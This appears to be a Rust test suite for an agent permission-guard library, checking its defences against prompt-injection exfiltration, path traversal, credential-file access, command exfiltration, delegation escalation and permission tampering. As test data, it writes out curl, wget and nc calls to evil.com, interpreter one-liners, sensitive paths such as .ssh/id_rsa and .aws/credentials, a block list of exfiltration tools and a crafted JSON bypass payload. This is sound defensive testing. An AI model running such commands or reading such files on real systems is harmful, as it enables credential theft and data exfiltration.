//! Attack Landscape Integration Tests
//!
//! This test suite verifies defense against real-world AI agent attack classes.
//! Each test group maps to a specific attack vector and documents the CVE or
//! attack class it defends against.
//!
//! ## Attack Surface Mapping
//!
//! | Attack Class | Primary Defense | Test Group |
//! |---|---|---|
//! | #1 RoguePilot (prompt injection → exfil) | Trifecta Guard | `trifecta_guard` |
//! | #5 Path traversal / credential theft | PathLattice sandbox | `path_security` |
//! | #6 DNS exfil / command injection | CommandLattice + Trifecta | `command_security` |
//! | Delegation privilege escalation | Monotonic meet | `delegation_monotonicity` |
//! | Permission lattice tampering | EffectivePermissions checksum | `permission_integrity` |
//!
//! ## Requirements
//!
//! - No network access required
//! - No LLM API keys required
//! - Deterministic (no flakiness)
//! - Fast execution (<5s total)

use lattice_guard::{
    CapabilityLattice, CapabilityLevel, CommandLattice, EffectivePermissions,
    IncompatibilityConstraint, Obligations, Operation, PathLattice, PermissionLattice,
    TrifectaRisk,
};
use std::path::Path;

// ============================================================================
// Test Group 1: Trifecta Guard
// Defends against: Attack #1 (RoguePilot), Attack #6 (DNS exfiltration)
//
// The "lethal trifecta" is the combination of:
//   1. Private data access (read_files, glob_search, grep_search)
//   2. Untrusted content exposure (web_fetch, web_search)
//   3. Exfiltration vector (git_push, create_pr, run_bash)
//
// When all three are present, prompt injection can exfiltrate secrets.
// ============================================================================

/// Attack #1 (RoguePilot) / Attack #6 (DNS exfil): When an agent has
/// read_files + web_fetch + run_bash, a prompt injection can read secrets,
/// embed them in DNS queries or HTTP requests, and exfiltrate via bash.
/// The trifecta guard must detect this as TrifectaRisk::Complete.
///
/// CVE-2025-53109 class: prompt injection leading to data exfiltration.
#[test]
fn test_trifecta_detects_read_fetch_bash_combination() {
    let caps = CapabilityLattice {
        read_files: CapabilityLevel::Always, // 1. Private data access
        web_fetch: CapabilityLevel::LowRisk, // 2. Untrusted content exposure
        run_bash: CapabilityLevel::LowRisk,  // 3. Exfiltration vector
        // Disable other exfil/untrusted vectors to test this specific combo
        web_search: CapabilityLevel::Never,
        git_push: CapabilityLevel::Never,
        create_pr: CapabilityLevel::Never,
        ..Default::default()
    };

    let constraint = IncompatibilityConstraint::enforcing();
    let risk = constraint.trifecta_risk(&caps);

    assert_eq!(
        risk,
        TrifectaRisk::Complete,
        "read_files + web_fetch + run_bash must be detected as Complete trifecta"
    );
    assert!(
        risk.requires_intervention(),
        "Complete trifecta must require intervention"
    );
}

/// Attack #1 (RoguePilot): When exfiltration vectors (run_bash, git_push)
/// are disabled, the trifecta is incomplete even if the agent can read
/// files and fetch untrusted content. This verifies that removing the
/// exfiltration leg breaks the attack chain.
#[test]
fn test_trifecta_safe_without_exfil() {
    let caps = CapabilityLattice {
        read_files: CapabilityLevel::Always, // 1. Private data access
        web_fetch: CapabilityLevel::LowRisk, // 2. Untrusted content exposure
        run_bash: CapabilityLevel::Never,    // 3. Exfil BLOCKED
        git_push: CapabilityLevel::Never,    // Exfil BLOCKED
        create_pr: CapabilityLevel::Never,   // Exfil BLOCKED
        ..Default::default()
    };

    let constraint = IncompatibilityConstraint::enforcing();
    let risk = constraint.trifecta_risk(&caps);

    assert_ne!(
        risk,
        TrifectaRisk::Complete,
        "Without exfiltration vectors, trifecta must NOT be Complete"
    );
    assert!(
        !risk.requires_intervention(),
        "Incomplete trifecta should not require intervention"
    );
}

/// Attack #1 (RoguePilot): When the trifecta is detected on a full
/// PermissionLattice, the meet operation must add approval obligations
/// to exfiltration operations. This ensures that even if an agent is
/// granted dangerous capabilities, the system gates the exfil path
/// behind human approval.
///
/// This tests the nucleus operator nu: L -> L' which projects onto
/// the quotient lattice of safe configurations.
#[test]
fn test_trifecta_constraint_adds_obligations() {
    // Create a PermissionLattice with all three trifecta legs
    let dangerous = PermissionLattice {
        capabilities: CapabilityLattice {
            read_files: CapabilityLevel::Always, // Private data
            web_fetch: CapabilityLevel::LowRisk, // Untrusted content
            git_push: CapabilityLevel::LowRisk,  // Exfil: git push
            create_pr: CapabilityLevel::LowRisk, // Exfil: PR creation
            run_bash: CapabilityLevel::LowRisk,  // Exfil: bash
            ..Default::default()
        },
        obligations: Obligations::default(), // Start with no obligations
        trifecta_constraint: true,
        ..Default::default()
    };

    // The meet with itself triggers normalization via the trifecta constraint
    let safe = dangerous.meet(&dangerous);

    // All exfiltration operations must now require approval
    assert!(
        safe.requires_approval(Operation::GitPush),
        "GitPush must require approval when trifecta is complete"
    );
    assert!(
        safe.requires_approval(Operation::CreatePr),
        "CreatePr must require approval when trifecta is complete"
    );
    assert!(
        safe.requires_approval(Operation::RunBash),
        "RunBash must require approval when trifecta is complete"
    );

    // Non-exfiltration operations should NOT gain obligations from trifecta
    // (WebFetch is untrusted content, not exfiltration)
    let constraint = IncompatibilityConstraint::enforcing();
    let trifecta_obligations = constraint.obligations_for(&safe.capabilities);
    assert!(
        !trifecta_obligations.requires(Operation::WebFetch),
        "WebFetch is not an exfiltration vector and should not gain trifecta obligations"
    );
}

/// Attack #1 (RoguePilot): Verify the graded risk levels form a proper
/// lattice ordering. An agent with only one trifecta component should
/// be Low risk, two components Medium, and all three Complete.
#[test]
fn test_trifecta_risk_grading_is_monotone() {
    let constraint = IncompatibilityConstraint::enforcing();

    // Zero components: all capabilities disabled
    let zero = CapabilityLattice {
        read_files: CapabilityLevel::Never,
        write_files: CapabilityLevel::Never,
        edit_files: CapabilityLevel::Never,
        run_bash: CapabilityLevel::Never,
        glob_search: CapabilityLevel::Never,
        grep_search: CapabilityLevel::Never,
        web_search: CapabilityLevel::Never,
        web_fetch: CapabilityLevel::Never,
        git_commit: CapabilityLevel::Never,
        git_push: CapabilityLevel::Never,
        create_pr: CapabilityLevel::Never,
        manage_pods: CapabilityLevel::Never,
    };
    assert_eq!(constraint.trifecta_risk(&zero), TrifectaRisk::None);

    // One component: just private data access
    let one = CapabilityLattice {
        read_files: CapabilityLevel::Always,
        ..zero.clone()
    };
    assert_eq!(constraint.trifecta_risk(&one), TrifectaRisk::Low);

    // Two components: private data + untrusted content
    let two = CapabilityLattice {
        web_fetch: CapabilityLevel::LowRisk,
        ..one.clone()
    };
    assert_eq!(constraint.trifecta_risk(&two), TrifectaRisk::Medium);

    // Three components: private data + untrusted content + exfiltration
    let three = CapabilityLattice {
        run_bash: CapabilityLevel::LowRisk,
        ..two.clone()
    };
    assert_eq!(constraint.trifecta_risk(&three), TrifectaRisk::Complete);

    // Verify monotonicity: None < Low < Medium < Complete
    assert!(TrifectaRisk::None < TrifectaRisk::Low);
    assert!(TrifectaRisk::Low < TrifectaRisk::Medium);
    assert!(TrifectaRisk::Medium < TrifectaRisk::Complete);
}

// ============================================================================
// Test Group 2: Path Security
// Defends against: Attack #1 (credential theft), Attack #5 (path traversal)
//
// An agent with file access must not be able to read .env files, SSH keys,
// PEM certificates, or escape a sandbox directory.
// ============================================================================

/// Attack #1 / #5: Sensitive files (.env, SSH keys, PEM certs, etc.) must be
/// blocked by PathLattice::block_sensitive() regardless of how they are
/// referenced. This prevents credential theft via direct file access.
#[test]
fn test_sensitive_files_blocked() {
    let lattice = PathLattice::block_sensitive();

    let sensitive_paths = [
        ".env",
        ".env.local",
        ".env.production",
        ".ssh/id_rsa",
        "server.key",
        "ca-cert.pem",
        "secrets/db_password",
        ".aws/credentials",
    ];

    for path in sensitive_paths {
        assert!(
            !lattice.can_access(Path::new(path)),
            "Sensitive path '{}' must be blocked by block_sensitive()",
            path
        );
    }
}

/// Attack #5 (path traversal): An agent must not be able to escape a
/// sandbox via ../../ sequences. The PathLattice normalizes paths to
/// prevent directory traversal attacks like reading /etc/passwd.
#[test]
fn test_path_traversal_denied() {
    let temp_dir = std::env::temp_dir()
        .canonicalize()
        .expect("temp_dir should be canonicalizable");
    let sandbox = temp_dir.join("agent_sandbox");
    let lattice = PathLattice::with_work_dir(&sandbox);

    // Classic path traversal attempts
    assert!(
        !lattice.can_access(Path::new("../../etc/passwd")),
        "../../etc/passwd traversal must be denied"
    );
    assert!(
        !lattice.can_access(Path::new("../../../etc/shadow")),
        "../../../etc/shadow traversal must be denied"
    );
    assert!(
        !lattice.can_access(Path::new("/etc/passwd")),
        "Absolute path /etc/passwd outside sandbox must be denied"
    );
}

/// CVE-2025-53109 pattern: Path prefix confusion. Verify that allowing
/// /tmp/allowed does NOT implicitly allow /tmp/allowed_evil. This tests
/// that PathLattice uses proper directory-boundary matching, not naive
/// string prefix matching.
///
/// Without this defense, an attacker can create /tmp/allowed_evil and
/// access it because "/tmp/allowed_evil".starts_with("/tmp/allowed")
/// returns true in a naive implementation.
#[test]
fn test_no_prefix_confusion() {
    // Create a sandbox at a specific path
    let temp_dir = std::env::temp_dir()
        .canonicalize()
        .expect("temp_dir should be canonicalizable");
    let allowed_dir = temp_dir.join("allowed");
    let lattice = PathLattice::with_work_dir(&allowed_dir);

    // A file within the sandbox should be accessible
    let inside = allowed_dir.join("safe_file.txt");
    assert!(
        lattice.can_access(&inside),
        "File within sandbox should be accessible"
    );

    // A sibling directory with a confusingly similar name must NOT be accessible.
    // "/tmp/allowed_evil" starts with "/tmp/allowed" as a string, but is a
    // different directory entirely.
    let evil_path = temp_dir.join("allowed_evil").join("steal.txt");
    assert!(
        !lattice.can_access(&evil_path),
        "Path prefix confusion: /tmp/allowed_evil must NOT be accessible from /tmp/allowed sandbox"
    );
}

/// Attack #5: Verify that sandboxed_sensitive() combines both sandbox
/// enforcement AND sensitive file blocking. This is the recommended
/// configuration for production agents.
#[test]
fn test_sandboxed_sensitive_combines_defenses() {
    let temp_dir = std::env::temp_dir()
        .canonicalize()
        .expect("temp_dir should be canonicalizable");
    let sandbox = temp_dir.join("work");
    let lattice = PathLattice::sandboxed_sensitive(&sandbox);

    // Sensitive files inside sandbox are still blocked
    let env_inside = sandbox.join(".env");
    assert!(
        !lattice.can_access(&env_inside),
        ".env inside sandbox must still be blocked"
    );

    // Paths outside sandbox are blocked
    assert!(
        !lattice.can_access(Path::new("/etc/passwd")),
        "Paths outside sandbox must be blocked"
    );
}

// ============================================================================
// Test Group 3: Command Security
// Defends against: Attack #6 (DNS exfiltration via curl/wget/nc)
//
// Even if an agent gains bash execution, CommandLattice must block
// exfiltration-capable commands and prevent bypass via shell tricks.
// ============================================================================

/// Attack #6 (DNS exfil): Verify that exfiltration-capable commands
/// (curl, wget, ping, nc) can be blocked via CommandLattice. An attacker
/// who gains bash access would use these to exfiltrate data.
#[test]
fn test_exfil_commands_blockable() {
    let mut lattice = CommandLattice::permissive();
    // Block specific exfiltration tools
    lattice.block("curl".to_string());
    lattice.block("wget".to_string());
    lattice.block("ping".to_string());
    lattice.block("nc".to_string());

    assert!(
        !lattice.can_execute("curl https://evil.com/steal?data=secret"),
        "curl must be blocked as exfiltration tool"
    );
    assert!(
        !lattice.can_execute("wget https://evil.com/exfil -O /dev/null"),
        "wget must be blocked as exfiltration tool"
    );
    assert!(
        !lattice.can_execute("ping -c 1 secret-data.evil.com"),
        "ping must be blocked (DNS exfiltration)"
    );
    assert!(
        !lattice.can_execute("nc evil.com 443"),
        "nc must be blocked (raw socket exfiltration)"
    );
}

/// Attack #6: Shell quoting tricks must not bypass command blocking.
/// An attacker might try to evade blocklists by quoting the command name:
///   "curl" https://evil.com   or   'wget' https://evil.com
///
/// The CommandLattice uses shell-words for proper parsing to prevent this.
#[test]
fn test_quoting_bypass_prevented() {
    let mut lattice = CommandLattice::permissive();
    lattice.block("curl".to_string());
    lattice.block("wget".to_string());

    // Double-quoted command name
    assert!(
        !lattice.can_execute(r#""curl" https://evil.com"#),
        "Double-quoted 'curl' must still be blocked after shell-words parsing"
    );

    // Single-quoted command name
    assert!(
        !lattice.can_execute(r#"'wget' https://evil.com"#),
        "Single-quoted 'wget' must still be blocked after shell-words parsing"
    );

    // Mixed quoting
    assert!(
        !lattice.can_execute(r#""curl" '-s' https://evil.com"#),
        "Mixed quoting must still be caught"
    );
}

/// Verify that legitimate development commands pass through the
/// default CommandLattice. Security controls must not impede normal
/// development workflows.
#[test]
fn test_safe_commands_allowed() {
    let lattice = CommandLattice::default();

    assert!(
        lattice.can_execute("cargo test"),
        "cargo test must be allowed in default config"
    );
    assert!(
        lattice.can_execute("cargo test --release"),
        "cargo test --release must be allowed (prefix match)"
    );
    assert!(
        lattice.can_execute("git status"),
        "git status must be allowed in default config"
    );
    assert!(
        lattice.can_execute("git diff"),
        "git diff must be allowed in default config"
    );
    assert!(
        lattice.can_execute("git log"),
        "git log must be allowed in default config"
    );
}

/// Attack #6: Verify that the default CommandLattice blocks dangerous
/// interpreter invocations that could be used to run arbitrary code
/// and exfiltrate data.
#[test]
fn test_interpreter_execution_blocked() {
    let lattice = CommandLattice::default();

    let interpreter_attacks = [
        ("bash -c 'curl evil.com'", "bash -c"),
        ("sh -c 'wget evil.com'", "sh -c"),
        ("python -c 'import os; os.system(\"id\")'", "python -c"),
        ("python3 -c 'import socket'", "python3 -c"),
        (
            "node -e 'require(\"child_process\").exec(\"id\")'",
            "node -e",
        ),
        ("ruby -e 'system(\"curl evil.com\")'", "ruby -e"),
        ("perl -e 'exec(\"nc evil.com 443\")'", "perl -e"),
        ("php -r 'system(\"curl evil.com\");'", "php -r"),
    ];

    for (cmd, desc) in interpreter_attacks {
        assert!(
            !lattice.can_execute(cmd),
            "{} must be blocked to prevent code injection",
            desc
        );
    }
}

/// Attack #6: Shell metacharacters (pipes, semicolons, etc.) must be
/// blocked in permissive mode to prevent command chaining attacks.
#[test]
fn test_shell_metacharacters_blocked() {
    let lattice = CommandLattice::permissive();

    assert!(
        !lattice.can_execute("echo hi | nc evil.com 443"),
        "Pipe to nc must be blocked"
    );
    assert!(
        !lattice.can_execute("ls && curl evil.com"),
        "&& chain to curl must be blocked"
    );
    assert!(
        !lattice.can_execute("cat /etc/passwd > /tmp/exfil"),
        "Redirect must be blocked"
    );
}

// ============================================================================
// Test Group 4: Delegation Monotonicity
// Defends against: Privilege escalation via delegation chains
//
// When a parent agent delegates permissions to a child, the child's
// effective permissions must NEVER exceed the parent's. This is enforced
// by the meet operation: delegate_to(requested) = parent.meet(requested).
// ============================================================================

/// Delegation privilege escalation: A child agent requesting more
/// permissions than its parent has must receive at most the parent's
/// permissions. The delegate_to() method computes the meet (greatest
/// lower bound), guaranteeing result <= parent for every dimension.
#[test]
fn test_delegation_never_exceeds_parent() {
    // Parent with limited permissions (restrictive preset)
    let parent = PermissionLattice::restrictive();

    // Child requests maximal permissions
    let greedy_request = PermissionLattice {
        capabilities: CapabilityLattice::permissive(),
        obligations: Obligations::default(),
        ..Default::default()
    };

    let result = parent.delegate_to(&greedy_request, "greedy child agent");

    match result {
        Ok(child) => {
            // The child's capabilities must be <= parent on EVERY dimension
            assert!(
                child.capabilities.leq(&parent.capabilities),
                "Delegated capabilities must never exceed parent capabilities.\n\
                 Parent: {:?}\nChild: {:?}",
                parent.capabilities,
                child.capabilities
            );

            // Spot-check specific dimensions
            assert!(
                child.capabilities.run_bash <= parent.capabilities.run_bash,
                "Child run_bash must not exceed parent"
            );
            assert!(
                child.capabilities.git_push <= parent.capabilities.git_push,
                "Child git_push must not exceed parent"
            );
            assert!(
                child.capabilities.web_fetch <= parent.capabilities.web_fetch,
                "Child web_fetch must not exceed parent"
            );
        }
        Err(_) => {
            // Delegation failure (e.g., budget exceeded) is also acceptable --
            // the point is that escalation never succeeds.
        }
    }
}

/// Delegation chain monotonicity across multiple hops: root -> L1 -> L2 -> L3.
/// Each hop must be monotonically non-increasing, and transitivity must hold:
/// L3 <= L1 <= root.
#[test]
fn test_delegation_chain_monotonicity() {
    let root = PermissionLattice::permissive();
    let l1 = root
        .delegate_to(&PermissionLattice::default(), "orchestrator")
        .expect("L1 delegation should succeed");
    let l2 = l1
        .delegate_to(&PermissionLattice::default(), "sub-agent")
        .expect("L2 delegation should succeed");
    let l3 = l2
        .delegate_to(&PermissionLattice::default(), "leaf-agent")
        .expect("L3 delegation should succeed");

    // Monotonicity at each hop
    assert!(l1.leq(&root), "L1 must be <= root");
    assert!(l2.leq(&l1), "L2 must be <= L1");
    assert!(l3.leq(&l2), "L3 must be <= L2");

    // Transitive monotonicity
    assert!(l3.leq(&root), "L3 must be <= root (transitivity)");
}

/// Delegation must fail when the child requests more budget than the
/// parent has remaining. This prevents a child from spending more
/// than its allocation.
#[test]
fn test_delegation_budget_overcommit_rejected() {
    let mut parent = PermissionLattice {
        budget: lattice_guard::BudgetLattice::with_cost_limit(10.0),
        ..PermissionLattice::default()
    };
    // Consume most of the parent's budget
    parent.budget.charge_f64(9.5);

    let child_request = PermissionLattice {
        budget: lattice_guard::BudgetLattice::with_cost_limit(5.0),
        ..Default::default()
    };

    let result = parent.delegate_to(&child_request, "over-budget child");
    assert!(
        result.is_err(),
        "Delegation must fail when requested budget ($5) exceeds remaining ($0.50)"
    );
}

// ============================================================================
// Test Group 5: Permission Integrity
// Defends against: Permission lattice tampering in transit or at rest
//
// EffectivePermissions includes a SHA-256 checksum that detects any
// modification to the lattice after it was computed. This prevents
// an attacker from modifying permissions after they've been granted.
// ============================================================================

/// Permission tampering: Verify that EffectivePermissions with an
/// unmodified lattice passes integrity verification, and that any
/// modification to the lattice (e.g., escalating a capability,
/// changing the description) is detected by the checksum.
#[test]
fn test_effective_permissions_detect_tampering() {
    let original = PermissionLattice::default();
    let effective = EffectivePermissions::new(original);

    // Integrity should pass on untampered permissions
    assert!(
        effective.verify_integrity(),
        "Untampered EffectivePermissions must pass integrity check"
    );

    // Tamper: modify the description
    let mut tampered_desc = effective.clone();
    tampered_desc.lattice.description = "i am root".to_string();
    assert!(
        !tampered_desc.verify_integrity(),
        "Tampering with description must be detected"
    );

    // Tamper: escalate a capability
    let mut tampered_caps = effective.clone();
    tampered_caps.lattice.capabilities.run_bash = CapabilityLevel::Always;
    assert!(
        !tampered_caps.verify_integrity(),
        "Escalating run_bash capability must be detected by integrity check"
    );

    // Tamper: remove an obligation
    let mut tampered_obligations = effective.clone();
    tampered_obligations.lattice.obligations = Obligations::default();
    assert!(
        !tampered_obligations.verify_integrity(),
        "Removing obligations must be detected by integrity check"
    );
}

/// Permission tampering: Verify that the checksum changes when the
/// trifecta constraint is disabled. An attacker who can flip this
/// bit gains unguarded access to the lethal trifecta.
#[test]
#[cfg(feature = "testing")]
fn test_integrity_detects_trifecta_disable() {
    let perms = PermissionLattice::default();
    let effective = EffectivePermissions::new(perms);
    assert!(effective.verify_integrity());

    // Tamper: disable trifecta constraint
    let mut tampered = effective.clone();
    tampered.lattice.trifecta_constraint = false;
    assert!(
        !tampered.verify_integrity(),
        "Disabling trifecta_constraint must be detected as tampering"
    );
}

/// Permission deserialization bypass: When a PermissionLattice is
/// deserialized from JSON, the trifecta_constraint field must ALWAYS
/// be set to true, regardless of what the JSON payload says. This
/// prevents an attacker from crafting a payload with
/// "trifecta_constraint": false to bypass the lethal trifecta guard.
#[test]
#[cfg(feature = "serde")]
fn test_deserialization_always_enforces_trifecta() {
    let malicious_json = r#"{
        "id": "00000000-0000-0000-0000-000000000001",
        "description": "bypass attempt",
        "derived_from": null,
        "capabilities": {
            "read_files": "always",
            "write_files": "low_risk",
            "edit_files": "low_risk",
            "run_bash": "low_risk",
            "glob_search": "always",
            "grep_search": "always",
            "web_search": "low_risk",
            "web_fetch": "low_risk",
            "git_commit": "low_risk",
            "git_push": "low_risk",
            "create_pr": "low_risk"
        },
        "obligations": {"approvals": []},
        "paths": {"allowed": [], "blocked": [], "work_dir": null},
        "budget": {"max_cost_usd": "10", "consumed_usd": "0", "max_input_tokens": 100000, "max_output_tokens": 10000},
        "commands": {"allowed": [], "blocked": []},
        "time": {"valid_from": "2024-01-01T00:00:00Z", "valid_until": "2030-01-01T00:00:00Z"},
        "trifecta_constraint": false,
        "created_at": "2024-01-01T00:00:00Z",
        "created_by": "attacker"
    }"#;

    let perms: PermissionLattice =
        serde_json::from_str(malicious_json).expect("Should parse despite malicious content");

    // The constraint must ALWAYS be true after deserialization
    assert!(
        perms.trifecta_constraint,
        "trifecta_constraint must be forced to true on deserialization, \
         regardless of JSON input"
    );

    // Since trifecta is complete (all three legs present), exfil must require approval
    assert!(
        perms.requires_approval(Operation::GitPush),
        "GitPush must require approval after deserialization normalization"
    );
    assert!(
        perms.requires_approval(Operation::RunBash),
        "RunBash must require approval after deserialization normalization"
    );
}
